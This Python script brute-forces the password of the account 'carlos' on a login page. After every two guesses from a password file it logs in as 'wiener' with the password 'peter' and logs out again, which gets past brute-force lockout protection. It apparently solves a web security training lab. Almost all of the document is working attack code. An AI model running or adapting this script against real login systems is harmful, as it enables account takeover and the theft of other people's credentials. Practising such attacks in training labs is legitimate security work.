import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_password():
    
    password = None
    with open('passwords.txt') as f:
        password = f.readlines()
    return password


def get_carlos_account(sess, url):
    
    counter = 0
    login_url = url + "/login"
    logout_url = url + "/logout"
    
    try:
        for i in range(get_password().__len__() * 2):
        
            if i % 3:
            
                #data for carlos user with iterating password
                brute_data = {"username" : "carlos", "password" : f"{get_password()[counter].strip()}"}
                
                #request to the login url
                r = sess.post(login_url, data=brute_data, verify=False, proxies=proxies)
                
                
                if "Log out" in r.text:
                    print("(+) Successfully get the carlos password")
                    print("(+) Password is : " + brute_data["password"])
                    sys.exit(-1)

                #for reading password from the "paswords.txt"
                counter += 1
                
            else:
                
                #data for wiener user with default password
                real_data = {"username" : "wiener", "password" : "peter"}
                
                #request to the login url
                r = sess.post(login_url, data=real_data, verify=False, proxies=proxies)
                
                #If peter is successfully login, logout to continue brute forcing. 
                if "Log out" in r.text:
                    print("(+) Peter Login")
                    r = sess.get(logout_url, verify=False, proxies=proxies)
                    print("(-) Peter Logout")
                    
            
    except IndexError:
        pass
            

def main():
    
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    
    sess = requests.Session()
    url = sys.argv[1]
    get_carlos_account(sess, url)

if __name__ == "__main__":
    main()